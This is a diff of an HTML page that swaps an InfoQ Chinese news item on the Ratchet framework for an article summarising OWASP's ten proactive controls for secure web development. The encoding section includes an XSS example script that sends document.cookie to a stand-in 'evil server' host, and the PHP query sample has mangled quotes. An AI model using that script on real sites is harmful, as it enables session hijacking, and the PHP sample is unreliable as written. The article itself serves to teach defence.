@@ -1,16 +1,39 @@
-<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>Ratchet成为一个真正的框架，并有了新家</h3><p>移动应用程序原型设计工具<a href="http://goratchet.com/">Ratchet</a>已经被提升为一个完整的应用程序框架。Ratchet的2.02版已经发布，它使用<a href="http://sass-lang.com/">SASS </a>CSS预处理器（对版本1）进行了彻底地重写。除了彻底改造外，Ratchet如今在现有的基础Ratchet主题之外提供了iOS和Android风格。它现在还提供了一种名为“Ratcheticons”的新图标字体，以及<a href="http://goratchet.com/examples/">三个示例应用程序</a>来展示不同的主题。文档已经针对新版本进行了彻底修订，项目本身已经迁移到<a href="https://github.com/twbs">Bootstrap GitHub</a>上，并成为Bootstrap组织的一部分。</p>
-<p>Ratchet最初是Twitter的一套面向iOS原生应用程序的HTML/CSS原型。在看到这些原型对于开发过程多么重要之后，团队决定将其作为一个移动应用程序原型设计工具开源。团队很快就清楚地认识到，Ratchet不仅非常适合构建移动应用程序原型，而且还非常适合完备的移动应用程序。</p>
-<p>Ratchet最初使用纯CSS编写，2.02版本现在使用<a href="http://sass-lang.com/">SASS</a>预处理器语言。Ratchet的共同创建者<a href="http://www.twitter.com/connors">Connor Sears</a>表示，使用SASS重写源于他们想要“预处理器的灵活性”。Connor提到，他选择SASS只是因为那是他最熟悉的东西。Bootstrap项目本身（Ratchet现在是它的一部分）使用<a href="http://lesscss.org/">LESS </a>CSS预处理器。</p>
-<p>Ratchet最初只有一种风格，可以使用CSS进行调整。现在，它有三种风格，支持多种外观。最初的基础风格还在，但现在有了iOS和Android风格，它们可以更好地适应各自的操作系统。在大多数情况下，这只涉及风格，但也有一些组件，如Popover，在指定平台上的行为有很大的差异。</p>
-<p><img src="http://infoqstatic.com/resource/news/2014/04/ratchet-2-real-framework-new-hom/zh/resources/0410000.jpg" width="600" _href="img://null" _p="true" alt="" /></p>
-<p>Ratchet并没有试图在平台或浏览器方面使用CSS做任何特别的事。它的目标是保持简洁，那样更容易理解和实现。</p>
-<p>新的Ratcheticons图标字体包含45个常用的应用程序图标。这些图标使用HTML<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-elements">伪元素</a>进行展示。例如，一个齿轮图标可以使用一个简单的<b>span</b>和一个CSS class进行展示。</p>
-<pre>
-&lt;span class=&quot;icon icon-gear&quot;&gt;&lt;/span&gt; </pre>
-<p>齿轮图标的class包含了目标字体字符的Unicode码，后者在<b>：</b><b>before</b>伪元素中进行展示。</p>
-<pre>
-.icon-code:before { content: '\e812'; } </pre>
-<p>经过彻底修订的Ratchet文档提供了三个完备的应用程序示例。这些示例允许开发人员在他们的移动设备上测试Ratchet，并为他们提供了一个创建新应用程序的起始点。现在，Ratchet有<a href="http://goratchet.com/examples/app-movies/">电影搜索器</a>（基础主题）、<a href="http://goratchet.com/examples/app-ios-mail/">iOS邮件</a>（iOS主题）和<a href="http://goratchet.com/examples/app-android-notes/">Android备忘录应用程序</a>（Android主题）三个示例。</p>
-<p>另外，Ratchet已经迁移到Bootstrap GitHub版本库。Connor是这样解释这次迁移的，“Ratchet一直是Bootstrap的‘小兄弟’，将它迁入<a name="OLE_LINK5"></a><a name="OLE_LINK4">Bootstrap</a>组织不过是件自然而然的事。”他指出，虽然Ratchet已经迁入Bootstrap组织，但他们并未计划“合并”这些框架。“我们会继续将[Ratchet和Bootstrap] CSS架构同等对待”。从根本上说，我希望熟悉Bootstrap的人在使用Ratchet的CSS时感觉非常自在。</p>
-<p>Ratchet在GitHub上大受欢迎，现在已经有超过7千9百颗星。相比之下，Bootstrap本身有超过6万6千颗。读者可以从<a href="http://goratchet.com/">Ratchet官方网站</a>或<a href="https://github.com/twbs/ratchet">twbs GitHub版本库</a>下载。</p>
-<p><b>查看英文原文：</b><b><a href="http://www.infoq.com/news/2014/04/ratchet-2-real-framework-new-hom">Ratchet Becomes a Real Framework, Gets a New Home</a></b> </p><br><br><br><br><br><br></body></html>
+<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>OWASP发布构建安全Web应用的十大控制措施</h3><p><a href="https://www.owasp.org/">Open Web Application Security Project（OWASP）</a>是世界范围内的非盈利组织，关注于提高软件系统的安全性。它们的使命是使应用软件更加安全，使企业和组织能够对应用安全风险作出更清晰的决策。<a href="http://www.infoq.com/cn/news/2013/11/owasptop10">OWASP发布的十大安全风险</a>整理总结了Web应用开发中常见的漏洞，可以用来探查和分析应用的安全问题。 </p>
+<p>不过，仅仅指出问题往往是不够的，开发人员是应用的基础，为了开发出安全的应用，必须要为他们提供必要的帮助和支持。编写Web应用的软件开发人员需要掌握和练习各种安全编码的技术。Web应用的每一层，包括用户界面、业务逻辑、控制器以及数据库代码，在编写的时候都必须将安全问题牢记在心，这可能是非常困难的一项任务，因为大多数开发人员并没有太多安全方面的知识，而用来构建Web应用的语言和框架在安全方面通常缺乏必要的控制。在需求和设计阶段，可能也会有固有的缺陷，很少有组织为开发人员提供需求规约以指导他们编写安全的代码。 </p>
+<p>针对这一问题，OWASP从应用的架构、设计和研发角度总结了<a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls">构建安全应用的十大控制措施</a>，致力于提高软件设计和开发人员的安全意识和能力，进而提升应用的安全性。这十大措施中，有的很具体，有的只是通用的分类，有的是技术性的，有的是过程相关的。 </p>
+<p>具体来讲，这十大控制措施如下： </p>
+<ol> 
+ <li>参数化查询 <p>SQL注入是Web应用中最危险的漏洞之一，因为SQL注入较为容易被黑客探测到并且会给应用带来毁灭性的打击。只需在你的Web应用中注入一条简单的恶意SQL，你的整个数据库可能就会被窃取、擦除或者篡改。在运行数据库的主机上，甚至可以借助Web应用执行危险的操作系统命令。 </p><p>为了防止SQL注入，开发人员必须阻止那些不可信任的输入，这些输入将会解析成为SQL命令的一部分。要实现这一点，最好的一种方式就是使用被称做查询参数化（Query Parameterization）的编程技术。 </p><p>例如，在Java之中，查询参数化如下所示： </p><pre>String newName = request.getParameter(&quot;newName&quot;); 
+String id = request.getParameter(&quot;id&quot;); 
+PreparedStatement pstmt = con.prepareStatement(&quot;UPDATE EMPLOYEES SET NAME = ? WHERE ID = ?&quot;);  
+pstmt.setString(1, newName);  
+pstmt.setString(2, id);
+</pre> <p>在PHP之中，查询参数化样例如下所示： </p><pre>$email  = $_REQUEST[‘email’]; 
+$id’= $_REQUEST[‘id’]; 
+$stmt = $dbh-&gt;prepare(”update users set email=:new_email where id=:user_id”);  
+$stmt-&gt;bindParam(':new_email', $email); 
+$stmt-&gt;bindParam(':user_id', $id);
+</pre> </li>
+ <li>对数据进行编码 <p>编码（encoding）是一个很强大的工具，它有助于防范很多类型的攻击，尤其是注入攻击。本质上来讲，编码就是将特殊字符转换成对等的字符，但是转换后的字符对于目标解析器来说不再是敏感的。关于编码的一个样例就是防止跨站脚本攻击（XSS，Cross Site Scripting）。 </p><p>Web开发人员经常会动态地构建Web页面，页面中包含开发人员构建的HTML/JavaScript代码以及数据库中的数据，而这些数据最初是由用户输入的。输入的数据应该被视为不可信任且危险的，在构建安全的Web应用时，需要对其进行特殊的处理。当攻击者欺骗你的用户执行恶意的JavaScript时，就会发生跨站脚本攻击或者更恰当地称之为JavaScript注入，这些JavaScript脚本最初是构建到Web站点中的，XSS攻击会在用户的浏览器中执行，因此会产生各种各样的影响。 </p><p>例如，XSS站点涂改： </p><pre>&lt;script&gt;document.body.innerHTML(“Jim was here”);&lt;/script&gt;</pre> <p>XSS session窃取： </p><pre>&lt;script&gt; var img = new Image(); 
+img.src=&quot;hxxp://&lt;some evil server&gt;.com?” + document.cookie; 
+&lt;/script&gt;</pre> <p>持久化XSS（Persistent XSS）或存储XSS（Stored XSS）指的是XSS攻击嵌入到了站点的数据库或文件系统之中了。这种XSS更为危险，因为当攻击执行的时候，用户已经登录站点了。当将XSS攻击置于URL的结尾处时，会发生反射XSS（Reflected XSS），它会欺骗受害者访问该URL，当访问的时候攻击就会触发。 </p><p>阻止XSS的关键编程技术就是输出编码，它会在输出的时候执行，如果你构建用户界面的话，也就是在将非信任的数据添加到HTML中的时候。能够阻止XSS的编码形式包括HTML实体编码、JavaScript编码以及百分号编码（也称为URL编码）。 </p> </li>
+ <li>校验所有的输入 <p>编写安全应用时，很重要的一点就是将所有来自于应用外部的输入（如来自于浏览器或移动客户端，来自于外部系统或文件）均视为不可信任的。对于Web应用来说，这包括HTTP头、cookies以及GET和POST参数，总而言之也就是任何攻击者可以入侵的数据。 </p><p>构建安全Web应用的一个重要方法就是限制用户能够提交到Web应用之中的输入。限制用户输入的技术称之为“输入校验”。在Web应用的服务器端，输入校验通常会用到正则表达式。 </p><p>有两种输入校验，分别为“白名单”和“黑名单”校验。白名单试图定义好的输入是什么样子的，任何不匹配“好输入”定义的输入都会被拒绝。“黑名单”校验会试图探测已知的攻击，只会拒绝这些攻击和非法字符。黑名单校验更为困难，因为可以通过编码或其他伪装技术绕过，所以在构建安全Web应用时并不推荐使用。 </p><p>但有些时候正则表达式是不够的，如果你的应用要处理markup，也就是不受信任的输入中会包含HTML片段，这样的话会很难进行校验，编码也是很困难的，因为编码的话会破坏输入中的标签。此时，会需要一个能够解析和清理HTML格式文本的库，如<a href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer">OWASP Java HTML Sanitizer</a>。 </p> </li>
+ <li>实现适当的访问控制 <p>授权（Authorization，Access Control）过程指的是请求要访问特定资源时，需要判断该请求是该准许还是拒绝。访问控制可能会非常复杂，在应用开发的初始阶段，需要考虑到一些“积极”的访问控制设计需求。在软件的安全设计中，访问控制是很重要的一块内容，因此事先需要进行充分考虑： </p><p><b><i>强制所有的请求都通过访问控制检查</i></b> </p><p>大多数的框架和语言只会检查程序员指定的特性，但是与之相反的做法是更以安全为中心的。可以考虑使用过滤器或其他的自动化机制以保证所有的请求都要经历某种类型的访问控制检查。 </p><p><b><i>默认拒绝</i></b> </p><p>结合自动化的访问控制检查，需要考虑拒绝访问所有没有配置访问控制的特性。但是通常情况下会采取相反的做法，也就是新创建的特性会自动允许所有用户访问，直到开发人员为其配置了安全检查的功能。 </p><p><b><i>在代码中，要避免硬编码基于策略的访问控制检查</i></b> </p><p>通常情况下，访问控制策略是硬编码在应用之中的。这样的话，审计或证明软件的安全性会变得非常困难且耗时。如果可能的话，访问控制策略和应用代码应该分离开来。 </p><p><b><i>针对活动编码</i></b> </p><p>在大多数的Web框架中会将基于角色的访问控制作为主要方法。尽管在访问控制机制中，使用角色是可以接受的，但是在应用代码中针对特定的角色编码是一种反模式。在代码中要考虑用户是不是有权限访问某个特性，而不是检查用户具备什么样的角色。 </p><p><b><i>驱动访问控制检查的是服务端的可信数据</i></b> </p><p>在作出访问控制决策的时候，会涉及到很多的数据（登录的用户是谁、这个用户具备什么样的权限、访问控制策略是什么、请求的特性和数据是什么、时间是什么、地理位置是哪里），这些数据应该通过“服务器端”标准的Web或Web服务应用来获取。策略数据，如用户角色和访问控制规则决不能作为请求的一部分。在标准的Web应用中，访问控制唯一需要的客户端数据就是要访问数据的id。作出访问控制决策的大多数其他数据需要从服务器端获取。 </p> </li>
+ <li>建立识别和认证控制 <p>认证过程指的是校验个人或实体是不是就是其所宣称的那个人。通常来讲，认证需要提交用户名或id，以及只有指定用户才能知道的一条或多条私人信息。 </p><p>会话管理指的是服务器端要维护与之交互的实体的状态。这就需要服务器能够记住整个事务期间如何与后续的请求进行交互。在服务器端，会话通过一个会话标识符来进行维护。 </p><p>识别管理是一个很广泛的话题，不仅仅包括认证和会话管理，还包括一些高级话题，如联合身份验证（identity federation）、单点登录、密码管理工具等等。 </p> </li>
+ <li>保护数据和隐私性 <p>当传输敏感的数据时，不管是在应用或网络架构的哪一层，都需要考虑以某种方式进行传输加密。对于应用传输加密来讲，SSL/TLS是目前最常见和广泛支持的一种模型。 </p><p>关于数据安全，很重要的一点在于要对系统中的数据进行分类，并确定哪些数据需要进行加密。 另外，还要保护正在处理中的数据，这些数据位于内存之中，可能更易于获取到。 </p> </li>
+ <li>实现日志和入侵探查 <p>应用的日志不应该是事后才考虑的事情，也不应该局限于调试或解决问题，它应该在其他重要的事情上发挥作用。安全事件的日志与进程监控、审计或事务日志在采集的目的上往往是不一样的，因此通常会进行区分。日志不要记得太多也太能太少，需要记住的一点是不要记录私人或敏感数据。为了防止日志注入（Log Injection），在记录前要对非信任的数据进行校验或编码。 </p><p><a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor项目</a>定义了概念化的框架和方法论，通过规范化的指导为已有的应用实现侵入探测和自动化响应。 </p> </li>
+ <li>使用框架和安全库的安全特性 <p>如果对于每个Web应用都从头开发安全控制功能的话，那会非常浪费时间并且会产生大量的安全漏洞。安全的代码库可以帮助开发人员注意安全相关功能的设计，并避免实现中漏洞。 </p><p>如果可以的话，要尽可能使用框架已有的特性，而不是引入第三方库。可以考虑的Web应用安全框架包括：<a href="http://static.springsource.org/spring-security/site/index.html">Spring Security</a>和<a href="http://shiro.apache.org/">Apache Shiro</a>。还有一点就是要及时更新这些框架和库。 </p> </li>
+ <li>将安全相关的需求考虑在内 <p>在软件开发项目的初期，需要定义三类安全相关的需求： </p>
+  <ol> 
+   <li>安全特性和功能：系统中可见的安全控制，包括认证、访问控制以及审计功能。这些需求通常会包含在用例或用户故事中，Q/A人员可以评估和测试功能的正确性。 </li>
+   <li>业务逻辑的滥用场景（abuse cases）：业务逻辑通常是包含多个步骤、多个分支的工作流程，这些需求的用户故事或用例应该包含异常和失败的场景，并且包含在“滥用场景”下的需求。滥用场景描述了在遭到攻击者破坏时，一项功能该是什么样子的。考虑到失败和滥用场景会发现校验和错误处理中的弱点，从而提升应用的可靠性和安全性。 </li>
+   <li>数据分类和隐私的需求：开发人员应当时刻注意系统中任何的私人和敏感数据，并确保它们是安全的。这会促使在系统中采用数据校验、访问控制、加密、审计以及日志控制等功能。 </li>
+  </ol> </li>
+ <li>在设计和架构时，将安全考虑在内 <p>在进行系统的架构和设计时，有一些安全相关的因素需要进行考虑，包括： </p>
+  <ol> 
+   <li>了解你所拥有的工具：你所选择的语言和平台会产生技术相关的安全风险和考量因素，开发团队必须要有所理解并进行管理。 </li>
+   <li>分层、信赖以及依赖：在安全的架构和设计中，另外一个很重要的部分就是分层和信赖。确定在客户端、Web层、业务逻辑层以及数据管理层要进行什么样的控制，以及不同系统间或同一个系统的不同部分之间，在什么地方建立信赖关系。信赖的边界确定了应该在什么地方进行认证、访问控制、数据校验和编码、加密以及日志记录。当对系统进行设计或设计变更时，要确保对信赖假设有充分的理解，并且这些假设是合法且一致的。 </li>
+   <li>管理受攻击面：注意系统的受攻击面（attack surface），也就是攻击者可以攻入系统、获取数据的方式。当你增加受攻击面时，要进行风险评估。你是不是引入了新的API或改变了系统中具有较高安全风险的功能，或者只是为已有页面或文件添加一个新的域？ </li>
+  </ol> </li>
+</ol>
+<p>以上就是OWASP列出的十大安全控制措施，在原文的页面中有大量相关资料的链接，感兴趣的读者可以进一步的学习和掌握。希望这十大措施能够为您的安全应用构建提供指导。</p><br><br><br><br><br><br></body></html>
